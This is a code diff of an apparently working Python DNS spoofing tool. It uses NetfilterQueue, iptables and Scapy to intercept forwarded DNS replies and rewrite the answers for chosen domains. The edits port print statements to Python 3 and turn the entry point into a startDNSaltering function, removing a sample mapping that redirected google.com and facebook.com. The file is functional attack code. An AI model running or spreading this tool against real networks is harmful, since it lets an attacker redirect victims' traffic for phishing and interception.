@@ -18,7 +18,7 @@ class Spoof:
         self.queue.bind(self.queueNum, self.poison)
         try:
             self.queue.run()
-            print 'queue run: '
+            print('queue run: ')
         except KeyboardInterrupt:
             os.system('sudo iptables -D FORWARD -j NFQUEUE --queue-num 1')
             print("[!] iptable rule flushed")
@@ -37,7 +37,7 @@ class Spoof:
                     del scapyPacket[UDP].len
                     del scapyPacket[UDP].chksum
                     del scapyPacket[Ether].chksum
-                    print "modified", queryName
+                    print("modified", queryName)
                     packet.set_payload(bytes(scapyPacket))
                 else:
                     print("not modified")
@@ -46,19 +46,10 @@ class Spoof:
             packet.set_payload(bytes(scapyPacket))
         return packet.accept()
  
- 
-if __name__ == '__main__':
-    try:
-        #ip adresses that we want to spoof
-        dictionary = {
-            b"google.com.": "157.240.201.35",
-            b"www.google.com.": "157.240.201.35",
-            b"www.facebook.com.": "142.251.39.100",
-            b"facebook.com.": "142.251.39.100"
-        }
-        queueNum = 1
-        spoof = Spoof(dictionary, queueNum)
-        spoof()
-    except OSError as error:
-        log.error(error)
+
+def startDNSaltering(dictionary):
+    queueNum = 1
+    spoof = Spoof(dictionary, queueNum)
+    spoof()
+
 
